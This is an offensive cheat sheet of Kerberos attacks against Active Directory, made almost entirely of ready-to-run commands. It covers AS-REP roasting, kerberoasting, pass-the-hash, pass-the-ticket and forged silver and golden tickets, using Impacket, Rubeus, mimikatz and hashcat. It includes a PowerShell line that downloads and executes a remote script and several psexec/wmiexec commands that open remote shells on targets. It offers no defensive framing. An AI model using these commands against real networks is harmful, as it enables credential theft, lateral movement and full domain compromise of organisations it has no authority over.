# exploit kerberos authentication with ticket attacks. example: asrep roasting, kerberoasting, golden tickets

## brute force authentication
```bash
# kerbrute username enumeration
python kerbrute.py -domain corp.com -users users.txt -passwords pass.txt -outputfile results.txt

# rubeus brute force
.\Rubeus.exe brute /users:users.txt /passwords:pass.txt /domain:corp.com /outfile:results.txt
.\Rubeus.exe brute /passwords:pass.txt /outfile:results.txt
```

## asreproasting (no preauth required)
```bash
# impacket - all domain users (need creds)
python GetNPUsers.py corp.com/user:pass -request -format hashcat -outputfile asrep.hashes

# impacket - user list (no creds needed)
python GetNPUsers.py corp.com/ -usersfile users.txt -format hashcat -outputfile asrep.hashes

# rubeus asreproast
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.hashes

# crack hashes
hashcat -m 18200 -a 0 asrep.hashes rockyou.txt
john --wordlist=rockyou.txt asrep.hashes
```

## kerberoasting (service accounts)
```bash
# impacket get service tickets
python GetUserSPNs.py corp.com/user:pass -outputfile tgs.hashes

# rubeus kerberoast
.\Rubeus.exe kerberoast /outfile:tgs.hashes

# powershell method
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII tgs.hashes

# crack service tickets
hashcat -m 13100 --force tgs.hashes rockyou.txt
john --format=krb5tgs --wordlist=rockyou.txt tgs.hashes
```

## overpass-the-hash / pass-the-key
```bash
# impacket - get tgt with ntlm hash
python getTGT.py corp.com/user -hashes :ntlm_hash

# impacket - get tgt with aes key
python getTGT.py corp.com/user -aesKey aes_key

# impacket - use ticket for remote exec
export KRB5CCNAME=user.ccache
python psexec.py corp.com/user@target.corp.com -k -no-pass
python smbexec.py corp.com/user@target.corp.com -k -no-pass
python wmiexec.py corp.com/user@target.corp.com -k -no-pass

# rubeus + psexec
.\Rubeus.exe asktgt /domain:corp.com /user:admin /rc4:ntlm_hash /ptt
.\PsExec.exe -accepteula \\target.corp.com cmd
```

## pass-the-ticket attacks
```bash
# collect tickets linux
grep default_ccache_name /etc/krb5.conf
# if KEYRING, use tickey
cp tickey /tmp/tickey && /tmp/tickey -i

# collect tickets windows - mimikatz
sekurlsa::tickets /export

# collect tickets windows - rubeus
.\Rubeus.exe dump
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("base64_ticket"))

# convert ticket formats
python ticket_converter.py ticket.kirbi ticket.ccache
python ticket_converter.py ticket.ccache ticket.kirbi

# use ticket linux
export KRB5CCNAME=ticket.ccache
python psexec.py corp.com/user@target -k -no-pass

# use ticket windows - mimikatz
kerberos::ptt ticket.kirbi

# use ticket windows - rubeus
.\Rubeus.exe ptt /ticket:ticket.kirbi
.\PsExec.exe -accepteula \\target cmd
```

## silver ticket (fake service ticket)
```bash
# impacket silver ticket
python ticketer.py -nthash service_ntlm -domain-sid domain_sid -domain corp.com -spn cifs/target.corp.com user
export KRB5CCNAME=user.ccache
python psexec.py corp.com/user@target.corp.com -k -no-pass

# mimikatz silver ticket
kerberos::golden /domain:corp.com /sid:domain_sid /rc4:service_ntlm /user:admin /service:cifs /target:target.corp.com
```

## golden ticket (fake tgt) [!]
```bash
# impacket golden ticket - need krbtgt hash
python ticketer.py -nthash krbtgt_ntlm -domain-sid domain_sid -domain corp.com admin

# mimikatz golden ticket
kerberos::golden /domain:corp.com /sid:domain_sid /aes256:krbtgt_aes /user:admin
```

## utility commands
```bash
# generate ntlm from password
python -c 'import hashlib,binascii; print(binascii.hexlify(hashlib.new("md4", "password".encode("utf-16le")).digest()).decode())'

# get domain sid
python getPac.py -targetUser admin corp.com/user:pass

# list spns
python GetUserSPNs.py corp.com/user:pass
```

## common spns to target
```bash
# high value service accounts
MSSQLSvc/*
HTTP/*
TERMSERV/*
WSMAN/*
SPN/FIMService
SPN/FIMSynchronizationService
```

# TODO: add constrained delegation attacks, s4u2self/s4u2proxy, dcsync techniques